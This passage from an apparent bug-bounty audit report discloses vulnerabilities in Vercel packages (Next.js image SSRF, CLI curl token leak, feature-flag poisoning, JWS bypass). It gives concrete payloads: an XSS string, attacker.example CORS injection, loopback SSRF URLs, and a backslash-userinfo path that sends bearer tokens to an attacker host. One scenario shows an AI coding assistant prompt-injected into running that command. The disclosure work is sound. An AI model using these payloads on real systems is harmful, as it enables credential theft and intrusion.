   - Because the guard checks `responseBuildId !== undefined`, an external server that omits `"b"` (`0:{"f":[["",["children","__PAGE__",["__PAGE__",{}],null,null],null,null,["$","$L1",null,{}],false]],"S":"$2"}\n1:["$","div",null,{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(document.domain)>"}}]\n`) sets `responseBuildId === undefined`, completely bypassing the Build ID check and mounting arbitrary React Virtual DOM (`UXSS`) into `https://victim-app.com`!
3. **Arbitrary HTTP Response Header Injection (`copyResponseHeaders`):**
   - `actionsForbiddenHeaders` (`action-handler.js:230-241`) only blocks 9 hop-by-hop/cookie headers, allowing an external redirect target to inject `Access-Control-Allow-Origin: https://attacker.example`, `Access-Control-Allow-Credentials: true`, `Clear-Site-Data: "storage"`, and `Content-Security-Policy` onto the `https://victim-app.com` Server Action response.

### Mounted HackerOne Report `#4152250` Follow-Up Comment #2 (`ADDENDUM-SCENARIOS-4152250.md`)

- **Scenario A (`previewModeId` Theft):** Verified against live `next@16.4.3`: `"leaked_token_matches_prerender_manifest_previewModeId": true` (`f5dbbd8f6a6a51a6aa8ff1443f7090dd`).
- **Scenario B (Global On-Demand ISR Cache Wiping):** Replaying `x-prerender-revalidate: f5dbbd8f6a6a51a6aa8ff1443f7090dd` against cached ISR routes returns `200 OK` (`x-nextjs-cache: REVALIDATED`), purging the global cache on every request.
- **Scenario C (Same-Origin Forged RSC Flight UI Injection & UXSS):** Verified `response_build_id_field_b: null`, `client_build_id_check_bypassed: true`, and `injected_cors_header_on_victim_origin: "https://attacker-oauth.example"`.


---

### III.40 — vercel/next.js (`next <= 16.4.3 (verified on published npm next@16.4.3 & canary)`) — Next.js `/_next/image` (`fetchExternalImage`) `3xx` Redirect `remotePatterns` Allowlist Bypass & `isPrivateIp()` Fail-Open Loopback/Internal SSRF (`VERCEL-NEXT-09` / HackerOne `#4152265`) (`CWE-918 / CWE-863`, CVSS `7.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/next.js` (`npm / Node.js: next`)
* **Affected Versions & Components:** `<= 16.4.3 (verified on published npm next@16.4.3 & canary)` — `packages/next/src/server/image-optimizer.ts:696-729`, `packages/next/src/server/lib/find-root.ts` / `validate-url.ts` (`isPrivateIp`)
* **Vulnerability Class & Score:** `CWE-918 / CWE-863` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md`](advisories/zh-CN/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Initial-Hop-Only `remotePatterns` Verification (`image-optimizer.js:586-615`):** `validateParams()` checks `hasMatch(domains, remotePatterns, href)` only once on the initial `/_next/image?url=...` parameter. When the allowlisted origin returns a `301`/`302`/`307`/`308` redirect, `fetchExternalImage()` resolves the new `Location` URL and calls `validateUrl(parsedRedirectUrl)` without re-evaluating `hasMatch(domains, remotePatterns, parsedRedirectUrl)`. This bypasses both **same-host pathname/search restrictions** (`/public-avatars/**` -> `/private-kyc-docs/passport-scan.png`) and **cross-host domain restrictions**.
2. **Step 2 — Mounted HackerOne Comment #1 (`RE-EVALUATION-COMMENT-4152265`): Why No Compromised Host Is Required on Hop 1:** Standard allowlisted image/avatar providers (Gravatar `https://www.gravatar.com/avatar/0000?d=https%3A%2F%2F...`, Cloudinary fetch URLs, and multi-tenant S3 / R2 / Supabase Storage / Vercel Blob buckets) natively return `302` redirects or allow any tenant to upload an image with `WebsiteRedirectLocation` (`301`), pivoting `fetchExternalImage()` to any external or internal host.
3. **Step 3 — Mounted HackerOne Comment #1 (`RE-EVALUATION-COMMENT-4152265`): Direct Linux Kernel TCP Socket Connection to `127.0.0.1` Without NAT64 via `isPrivateIp()` Fail-Open (`if (!ipaddr.isValid(ip)) return false`):** `next/dist/compiled/ipaddr.js` defines the IPv6 `zoneIndex` regex as `const o = "%[0-9a-z]{1,}"`, which only permits lowercase alphanumeric characters (`[0-9a-z]`) and rejects hyphens (`-`), underscores (`_`), and dots (`.`). On standard Linux / Docker / Kubernetes hosts with hyphenated network interfaces (`br-1a49f5828144`, `docker_gwbridge`, `cni-podman0`, `flannel.1`), `dns.promises.lookup("::ffff:127.0.0.1%br-1a49f5828144", { all: true })` succeeds in the Linux kernel (`getaddrinfo()`), `ipaddr.isValid()` returns `false`, `isPrivateIp()` fails open (`return false`), and Node's `http.get` opens a real TCP socket directly to `127.0.0.1` (`::ffff:127.0.0.1`)!
4. **Step 4 — Mounted HackerOne Comment #1 & #2 (`ADDENDUM-SCENARIOS-4152265`): WHATWG `URL` vs. `ipaddr.js` RFC 4291 `::7f00:1` Parser Differential & RFC 8215 `64:ff9b:1::/48` NAT64 Bypass:** When `fetchExternalImage` parses `Location: http://[::127.0.0.1]:8080/internal.png`, Node's WHATWG `new URL()` rewrites `::127.0.0.1` into hex `::7f00:1`. Both `0:0:0:0:0:0:127.0.0.1` and `::7f00:1` (as well as `::a9fe:a9fe` for `169.254.169.254` and `64:ff9b:1::a9fe:a9fe`) return `ipaddr.parse(ip).range() === "unicast"`, so `isPrivateIp()` returns `false`!

```javascript
// 1. Missing matchRemotePattern / hasMatch check on 3xx redirects in fetchExternalImage()
// File: node_modules/next/dist/esm/server/image-optimizer.js (lines 586-615)
if (res.status >= 300 && res.status < 400 && res.headers.get('location')) {
    if (redirectCount >= maxRedirects) {
        throw new ImageError(400, '"url" parameter reached maxRedirects');
    }
    const redirectUrl = new URL(res.headers.get('location'), href).href;
    const parsedRedirectUrl = new URL(redirectUrl);
    // BUG 1 (09A): Only calls validateUrl(parsedRedirectUrl); NEVER re-checks hasMatch(domains, remotePatterns, parsedRedirectUrl)!
    await validateUrl(parsedRedirectUrl);
    return fetchExternalImage(redirectUrl, dangerouslyAllowLocalIP, redirectCount + 1);
}

// 2. isPrivateIp() fails open on hyphenated Linux IPv6 zone indices & RFC 4291 / RFC 8215 ranges
// File: node_modules/next/dist/esm/server/lib/find-root.js
function isPrivateIp(ip) {
    if (!ipaddr.isValid(ip)) {
        return false; // BUG 2 (09B): Fail-open! "::ffff:127.0.0.1%br-1a49f5828144" -> isValid=false -> returns false!
    }
    const addr = ipaddr.parse(ip);
    const range = addr.range(); // BUG 3 (09B): "::7f00:1" and "64:ff9b:1::a9fe:a9fe" -> range="unicast" -> returns false!
    return PRIVATE_IP_RANGES.includes(range);
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Same-Host Pathname & Query-String Bypass (`/public-avatars/**` -> `/private-kyc-docs/passport-scan.png`) (Mounted HackerOne `#4152265` Addendum Scenario A):** A Next.js app restricts `remotePatterns` to `{ hostname: 'storage.company.example', pathname: '/public-avatars/**' }`. An attacker requests `/_next/image?url=https://storage.company.example/public-avatars/redir&w=64&q=75`, which returns `302 Found` -> `Location: /private-kyc-docs/passport-scan.png`. `fetchExternalImage()` follows the redirect and returns the sensitive image (`200 OK`, `image/png`) despite the `/public-avatars/**` pathname restriction.
* **Scenario B — Cross-Host Domain Allowlist Bypass via Standard Avatar/Storage Redirector (Mounted HackerOne `#4152265` Re-Evaluation Comment #1 & Addendum Scenario B):** A Next.js app allowlists Gravatar or a multi-tenant S3/Supabase/R2 bucket. The attacker uses a standard redirect URL (`?d=https://...` or S3 `WebsiteRedirectLocation`) to pivot `fetchExternalImage()` off the allowlisted domain onto an arbitrary unapproved host (`https://unapproved-internal-partner.example/diagram.png`).
* **Scenario C — Chained `09A -> 09B` Direct Linux `127.0.0.1` Loopback Socket Connection & Cloud Metadata SSRF (Mounted HackerOne `#4152265` Re-Evaluation Comment #1 & Addendum Scenario C):** The allowlisted host redirects to `http://[::ffff:127.0.0.1%25br-1a49f5828144]:45829/admin-badge.png` (or `http://[::127.0.0.1]/...` -> `::7f00:1` or `http://[64:ff9b:1::a9fe:a9fe]/...`). `dns.promises.lookup` resolves the address in the Linux kernel, `isPrivateIp()` returns `false` (fail-open on `%br-...` or `unicast` on `::7f00:1` / `64:ff9b:1::/48`), and `fetchExternalImage()` opens a real TCP socket to `127.0.0.1` (`remoteAddress: "::ffff:127.0.0.1"`) and exfiltrates the internal image!

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect fetchExternalImage and isPrivateIp in next@16.4.3
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/image-optimizer.js | sed -n '586,615p'
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/lib/find-root.js | sed -n '100,145p'

# 2. Run the Live next@16.4.3 End-to-End Verification Harness (09A + 09B + Linux Loopback Socket Proof)
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-09-nextjs-image-optimizer-redirect-and-nat64-ssrf.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-NEXT-09": {
    "RED": {
      "package_tested": "next@16.4.3",
      "hackerone_report": "#4152265 (with 2 follow-up comments mounted)",
      "same_host_pathname_bypass_status": 200,
      "cross_host_allowlist_bypass_status": 200,
      "scoped_loopback_input": "::ffff:127.0.0.1%br-1a49f5828144",
      "ipaddr_isValid": false,
      "nextjs_isPrivateIp_returned": false,
      "loopback_server_hit": true,
      "remote_address_seen_by_server": "::ffff:127.0.0.1",
      "rfc4291_ipv4_compatible_isPrivateIp": false,
      "rfc8215_local_nat64_isPrivateIp": false
    },
    "GREEN": {
      "redirect_hop_rechecks_hasMatch_remotePatterns": true,
      "invalid_or_hyphenated_zone_ip_fails_closed": true,
      "rfc4291_and_rfc8215_blocked": true,
      "loopback_server_hit": false
    }
  }
}
```

#### 5. Mounted HackerOne Follow-Up Comments
### Mounted HackerOne Report `#4152265` Follow-Up Comment #1 (`RE-EVALUATION-COMMENT-4152265.md`)

1. **No Compromised Host Needed for `remotePatterns` Bypass (`FINDING-09A`):**
   - **Vector A (Same-Host Pathname Restriction Bypass):** Bypasses `pathname: '/public-avatars/**'` on the exact same allowlisted domain to read `/private-kyc-docs/passport-scan.png`.
   - **Vector B (Built-In Open Redirectors on Popular Allowlisted Image Hosts):** Gravatar (`?d=https%3A%2F%2F...`), Cloudinary, and multi-tenant S3 / R2 / Supabase Storage / Vercel Blob buckets natively issue `301`/`302` redirects without any server compromise.
2. **No NAT64 Needed — Direct Linux Kernel TCP Socket Connection to `127.0.0.1` via `isPrivateIp()` Fail-Open (`if (!ipaddr.isValid(ip)) return false`):**
   - In `next/dist/compiled/ipaddr.js`, the IPv6 `zoneIndex` regex is `const o = "%[0-9a-z]{1,}"`, which rejects hyphens (`-`), underscores (`_`), and dots (`.`).
   - On standard Linux / Docker / Kubernetes hosts with hyphenated interfaces (`br-1a49f5828144`, `docker_gwbridge`, `cni-podman0`, `flannel.1`, `virbr0-nic`), `dns.promises.lookup("::ffff:127.0.0.1%br-1a49f5828144", { all: true })` succeeds in the Linux kernel (`getaddrinfo()`), `ipaddr.isValid()` returns `false`, `isPrivateIp()` returns `false` (fail-open!), and Node's `http.get` connects a real TCP socket directly to `127.0.0.1`!
3. **WHATWG `URL` vs. `ipaddr.js` Parser Differential on RFC 4291 IPv4-Compatible IPv6 (`::7f00:1` & `0:0:0:0:0:0:127.0.0.1`):**
   - Node's WHATWG `new URL('http://[::127.0.0.1]')` normalizes the hostname to `::7f00:1`. Both `ipaddr.parse('::7f00:1').range()` and `ipaddr.parse('0:0:0:0:0:0:127.0.0.1').range()` return `"unicast"`, so `isPrivateIp()` returns `false`!

### Mounted HackerOne Report `#4152265` Follow-Up Comment #2 (`ADDENDUM-SCENARIOS-4152265.md`)

- **Scenario A (Same-Host Pathname Bypass):** Verified `/public-avatars/redirect-to-private` -> `/private-kyc-docs/passport-scan.png` (`200 OK`, `68 bytes`).
- **Scenario B (Cross-Host Allowlist Bypass):** Verified `allowed-cdn.example` -> `unapproved-internal.example` (`200 OK`).
- **Scenario C (2-Step Chained Redirect `09A -> 09B` to `127.0.0.1` Loopback Socket):** Verified live TCP loopback connection on `next@16.4.3` (`loopback_server_hit: true`, `remote_address_seen_by_server: "::ffff:127.0.0.1"`, `status: 200`, `bytes_exfiltrated: 68`).


---

### III.41 — vercel/vercel (`vercel <= 65.4.0 (verified on published npm vercel@65.4.0)`) — Vercel CLI (`vercel@65.4.0`) `vercel curl` / `vercel http` WHATWG `URL` vs. `libcurl` Backslash-Userinfo / Brace-Globbing Parser Differential & Unhandled Auto-Mint Error Leaking Live Bearer Token and `x-vercel-protection-bypass` (`VERCEL-CLI-07`) (`CWE-200 / CWE-436`, CVSS `8.2 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/vercel` (`npm / Node.js: vercel`)
* **Affected Versions & Components:** `<= 65.4.0 (verified on published npm vercel@65.4.0)` — `packages/cli/src/commands/curl/utils.ts:34-42, 74-96, 179-216`, `packages/cli/src/commands/http-cli/index.ts`
* **Vulnerability Class & Score:** `CWE-200 / CWE-436` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md`](advisories/zh-CN/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — WHATWG `new URL()` vs. `libcurl` (`curl_url_set`) Authority Differential (`packages/cli/src/commands/curl/utils.ts:179-216`):** `constructFullUrl(baseUrl, path)` checks `const url = new URL(path, baseUrl); if (url.origin !== baseUrl) throw ...`, and then returns the **raw string concatenation** `return \`${baseUrl}${normalizedPath}\`` instead of `url.href`. When `path` is `\\@attacker.example/collect` (or `/\\@attacker.example`), WHATWG `new URL()` normalizes `\\` to `/`, seeing `https://my-app.vercel.app/%5C@attacker.example/collect` (`url.origin === baseUrl`). However, the raw string passed to `/usr/bin/curl` is `https://my-app.vercel.app\\@attacker.example/collect`, which `libcurl` parses as username `my-app.vercel.app\\` authenticating to host **`attacker.example`**!
2. **Step 2 — `libcurl` Globbing (`{a,b}`) & `--next` Flag Differential (`utils.ts:34-42`):** When `path` is `@attacker.example/{a,b}`, WHATWG `new URL()` treats `@attacker.example` as a relative path segment, whereas `libcurl`'s URL globbing expands `{a,b}` before authority parsing or processes injected `--next` flags (`extractUrlFromReadNextValue` rejects positional URLs after `--next` but still leaves `curlFlags` containing `--next` followed by `-K` / `--url`).
3. **Step 3 — Automatic Credential Attachment & Unhandled Auto-Mint Bypass Leak (`utils.ts:74-96`):** `vercel curl` automatically attaches `--header "Authorization: Bearer <VERCEL_TOKEN>"` and `x-vercel-protection-bypass: <32-char-secret>` to the `curl` invocation. Additionally, if `client.fetch(\`/v10/projects/${project.id}/protection-bypass\`, { method: 'PATCH' })` fails or returns non-JSON, `ensureProtectionBypassSecret` lacks a `try/catch` around `client.fetch` (`FINDING-07B`).

```typescript
// File: packages/cli/src/commands/curl/utils.ts (lines 179-216)
export function constructFullUrl(baseUrl: string, path: string): string {
  const normalizedPath = path.startsWith('/') ? path : `/${path}`;
  const url = new URL(normalizedPath, baseUrl);
  if (url.origin !== baseUrl) {
    throw new Error(`Invalid path "${path}": must be a relative path, not a full URL`);
  }
  // BUG: Returns raw string concatenation instead of normalized url.href, and does not
  // pass '--globoff' to curl! Input '\\@attacker.com/p' passes new URL() origin check
  // but libcurl parses 'baseUrl\\' as userinfo and 'attacker.com' as target host!
  return `${baseUrl}${normalizedPath}`;
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — CI/CD Smoke-Test & PR Preview Health-Check Secret Exfiltration:** A GitHub Actions workflow runs `vercel curl "$PREVIEW_PATH" --deployment "$DEPLOYMENT_URL"` where `$PREVIEW_PATH` comes from a PR annotation or smoke-test matrix (`\\@127.0.0.1:41992/exfil`). `constructFullUrl()` validates `url.origin === baseUrl`, but `/usr/bin/curl` connects to `127.0.0.1:41992` and sends `Authorization: Bearer vcp_live_...` and `x-vercel-protection-bypass: 0123456789abcdef0123456789abcdef`.
* **Scenario B — Developer Terminal / AI Coding Agent Prompt-Injection Credential Theft:** An engineer or AI coding assistant debugging a protected Vercel preview deployment runs a suggested command `vercel curl '\@logs-collector.example/api/debug'`. The developer's live Vercel CLI token and project protection bypass secret are immediately exfiltrated.
* **Scenario C — Unscoped Protection Bypass Secret Minting & Unhandled Crash (`FINDING-07B`):** When `project.protectionBypass` is initially empty, `ensureProtectionBypassSecret()` automatically sends `PATCH /v10/projects/{id}/protection-bypass` to mint a persistent project-wide bypass secret and immediately leaks it on the outbound `curl` request.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect constructFullUrl in published vercel@65.4.0
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/vercel/dist/commands/curl/utils.js | sed -n '1,180p'

# 2. Run the Live vercel@65.4.0 End-to-End Verification Harness against /usr/bin/curl
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-07-cli-curl-flag-and-url-hardening.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-CLI-07": {
    "RED": {
      "package_tested": "vercel@65.4.0",
      "curl_binary": "/usr/bin/curl 8.5.0",
      "ConstructFullUrl_output": "https://my-protected-deployment.vercel.app/\\@127.0.0.1:38343/exfiltrate",
      "whatwg_origin_check_passed": true,
      "attacker_listener_received_request": true,
      "leaked_authorization": "Bearer vcp_live_SECRET_VERCEL_CLI_TOKEN_998877",
      "leaked_protection_bypass": "0123456789abcdef0123456789abcdef"
    },
    "GREEN": {
      "backslash_and_at_segment_rejected": true,
      "returns_normalized_url_href": true,
      "curl_invoked_with_globoff": true,
      "attacker_listener_received_request": false
    }
  }
}
```


---

### III.42 — vercel/flags (`@vercel/flags-core <= 1.10.2 (verified on published npm @vercel/flags-core@1.10.2)`) — Vercel `@vercel/flags-core@1.10.2` Unprefixed `x-datafile-Updated-At` Header Watermark Poisoning & Permanent Feature-Flag Freeze DoS (`VERCEL-FLAGS-CORE-06`) (`CWE-400 / CWE-345`, CVSS `6.5 Medium`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/flags` (`npm / Node.js: @vercel/flags-core`)
* **Affected Versions & Components:** `<= 1.10.2 (verified on published npm @vercel/flags-core@1.10.2)` — `packages/flags-core/src/controller.ts:555-615`, `packages/flags-core/dist/index.js:465-516` (`streamResponse` / `readBundledDefinitions`)
* **Vulnerability Class & Score:** `CWE-400 / CWE-345` — **CVSS v3.1: `6.5 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md`](advisories/zh-CN/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unvalidated Header Watermark Update Before Body Verification (`packages/flags-core/src/controller.ts:555-615`):** In `streamResponse()` and `readBundledDefinitions()`, `@vercel/flags-core` reads `res.headers.get('x-datafile-Updated-At')`, parses it with `Number(updatedAtHeader)`, and immediately sets `this.datafileUpdatedAtWatermark = Math.max(this.datafileUpdatedAtWatermark, updatedAt)` BEFORE verifying `res.ok` (`200 OK`) or validating the JSON datafile body.
2. **Step 2 — Unprefixed Header Exposure Across Proxies & Error Responses:** Because `x-datafile-Updated-At` does NOT use the Vercel Edge-stripped `x-vercel-*` prefix, upstream proxies, mock/custom `FLAGS_SERVICE_URL` endpoints, or any non-200 HTTP response can inject `x-datafile-Updated-At: 9999999999999`.
3. **Step 3 — Permanent Flag Freeze / Kill-Switch Lockout:** Once `datafileUpdatedAtWatermark` is poisoned to `9999999999999`, every subsequent bundled or fallback flag update with a real timestamp (`updatedAt <= 9999999999999`) is silently ignored for the lifetime of the Node.js worker, preventing operators from toggling emergency kill-switches.

```typescript
// File: packages/flags-core/src/controller.ts (lines 555-615)
const res = await fetch(`${this.serviceUrl}/v1/stream`, { headers });
const updatedAtHeader = res.headers.get('x-datafile-Updated-At');
if (updatedAtHeader) {
  const updatedAt = Number(updatedAtHeader);
  if (!Number.isNaN(updatedAt)) {
    // BUG: Updates watermark BEFORE checking res.ok or validating the JSON datafile payload,
    // and accepts arbitrarily far-future timestamps (e.g. 9999999999999)!
    this.datafileUpdatedAtWatermark = Math.max(this.datafileUpdatedAtWatermark, updatedAt);
  }
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Emergency Kill-Switch Lockout During an Incident:** A single `502`/`503` response carrying `x-datafile-Updated-At: 9999999999999` poisons `datafileUpdatedAtWatermark`. When engineers later flip an emergency kill-switch in Vercel Flags, the running application ignores the bundled/fallback datafile (`updatedAt: 1700000100000 <= 9999999999999`) and keeps the vulnerable feature enabled (`stale-compromised-variant`).
* **Scenario B — Redirect Credential Leak on `FLAGS_SERVICE_URL` (`redirect: 'manual'` Missing):** If `streamResponse()` receives a `302` redirect from a custom or proxy `FLAGS_SERVICE_URL`, `fetch()` follows the redirect without `redirect: 'manual'`.
* **Scenario C — Persistent Multi-Worker Drift in Long-Lived Node.js Servers:** Poisoned workers permanently serve stale feature flags while healthy workers serve updated flags, causing inconsistent authorization and checkout behavior.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect streamResponse and readBundledDefinitions in published @vercel/flags-core@1.10.2
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/flags-core/dist/index.js | sed -n '465,516p'

# 2. Run the Live @vercel/flags-core@1.10.2 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-06-flags-core-controller-stream-hardening.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-FLAGS-CORE-06": {
    "RED": {
      "package_tested": "@vercel/flags-core@1.10.2",
      "initial_flag_value": "stale-compromised-variant",
      "bundled_legitimate_update_timestamp": 1700000100000,
      "poisoned_header_sent_on_503": "9999999999999",
      "flag_value_after_watermark_poisoning": "stale-compromised-variant",
      "legitimate_bundled_update_ignored": true
    },
    "GREEN": {
      "requires_res_ok_and_valid_datafile_before_watermark_update": true,
      "rejects_future_timestamp_skew": true,
      "legitimate_bundled_update_ignored": false
    }
  }
}
```


---

### III.43 — vercel/flags (`flags <= 4.4.0 (verified on published npm flags@4.4.0)`) — Vercel `flags@4.4.0` `deserialize()` Unauthenticated `__no_flags__` Sentinel Early-Return Bypassing Compact JWS Signature Verification (`VERCEL-FLAGS-05`) (`CWE-347`, CVSS `6.5 Medium`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/flags` (`npm / Node.js: flags`)
* **Affected Versions & Components:** `<= 4.4.0 (verified on published npm flags@4.4.0)` — `packages/flags/src/next/precompute.ts:206-214`, `packages/flags/dist/next/index.js:119-125` (`deserialize`)
* **Vulnerability Class & Score:** `CWE-347` — **CVSS v3.1: `6.5 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md`](advisories/zh-CN/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unconditional Early Return Before JWS Verification (`packages/flags/src/next/precompute.ts:206-214`):** `serialize()` returns `'__no_flags__'` only when `flags.length === 0`. However, `deserialize(flags, code, secret)` checks `if (code === '__no_flags__') return {};` at the very top of the function WITHOUT checking `if (flags.length === 0)` and BEFORE invoking `compactVerify(code, encodedSecret)`.
2. **Step 2 — Direct URL Segment Access in Next.js App Router (`app/[code]/...`):** In Next.js applications using Flags SDK precomputation (`app/[code]/checkout/page.tsx`), the `[code]` route parameter is normally generated and JWS-signed by Edge Middleware (`serialize(flags, values, secret)`). Because `[code]` is a URL path segment, an unauthenticated user can directly request `/__no_flags__/checkout` (or bypass middleware via path/header conditions).
3. **Step 3 — Fallback `flag.decide()` Execution Without Edge Context:** When `deserialize()` returns `{}` for `code = '__no_flags__'`, `getPrecomputed(flag, precomputeGroup, code)` sees `parsed[flag.key] === undefined` and falls back to re-running `flag.decide()` inside the Node/Page render context (where Edge geo/IP/middleware overrides are absent), flipping Edge-blocked flags (`true` instead of Edge-precomputed `false`).

```typescript
// File: packages/flags/src/next/precompute.ts (lines 206-214)
export async function deserialize(
  flags: ReadonlyArray<Flag<any, any>>,
  code: string,
  secret: string | undefined = process.env.FLAGS_SECRET,
): Promise<Record<string, any>> {
  if (!secret) throw new Error('flags: deserialize was called without a secret');
  // BUG: Returns {} BEFORE JWS signature verification even when flags.length > 0!
  if (code === '__no_flags__') return {};
  // ... JWS compactVerify() only runs below this line
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Bypassing Edge Middleware Geo/WAF Gating in Precomputed Routes:** Edge Middleware precomputes `vipCheckoutFlag = false` for an untrusted IP/region and signs it into a Compact JWS `[code]` segment. The client navigates directly to `/__no_flags__/checkout`, causing `deserialize()` to skip JWS verification, return `{}`, and trigger the page-level `decide()` fallback (`true`).
* **Scenario B — A/B Price & Promotion Tier Manipulation:** A user locked into a control pricing cohort by Edge Middleware replaces the signed JWS segment in the URL or rewrite header with `__no_flags__`, forcing re-evaluation without a valid `FLAGS_SECRET` signature.
* **Scenario C — Cache-Key Fragmentation & Origin Re-Decide Amplification:** Requesting `/__no_flags__/...` across precomputed ISR routes forces `getPrecomputed()` to execute asynchronous `flag.decide()` calls on every render instead of reading O(1) signed precomputed values.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect deserialize in published flags@4.4.0
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/flags/dist/next/index.js | sed -n '115,155p'

# 2. Run the Live flags@4.4.0 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-05-flags-precompute-no-flags-sentinel-bypass.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-FLAGS-05": {
    "RED": {
      "package_tested": "flags@4.4.0",
      "legitimate_signed_code_prefix": "eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..",
      "legitimate_precomputed_value": false,
      "forged_code_passed": "__no_flags__",
      "deserialize_output_for_no_flags": {},
      "getPrecomputed_value_with_no_flags_sentinel": true,
      "random_tampered_token_rejected": true
    },
    "GREEN": {
      "sentinel_rejected_when_flags_non_empty": true,
      "getPrecomputed_with_no_flags_throws": true
    }
  }
}
```


---

### III.44 — vercel/firewall (`@vercel/firewall <= 1.2.6 (verified on published npm @vercel/firewall@1.2.6 & Go ipc-proxy)`) — Vercel `@vercel/firewall@1.2.6` `checkRateLimit()` Untrusted `Host` Header / `region` SSRF Exfiltrating `VF_RATE_LIMIT_SECRET` & Fail-Open Rate-Limit Bypass (`VERCEL-FIREWALL-01`) (`CWE-918 / CWE-200 / CWE-636`, CVSS `7.2 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/firewall` (`npm / Node.js & Go: @vercel/firewall`)
* **Affected Versions & Components:** `<= 1.2.6 (verified on published npm @vercel/firewall@1.2.6 & Go ipc-proxy)` — `packages/firewall/src/rate-limit.ts:138-183, 211-285`, `cmd/ipc-proxy/client.go:34-41, 79-97`
* **Vulnerability Class & Score:** `CWE-918 / CWE-200 / CWE-636` — **CVSS v3.1: `7.2 High`** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md`](advisories/zh-CN/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
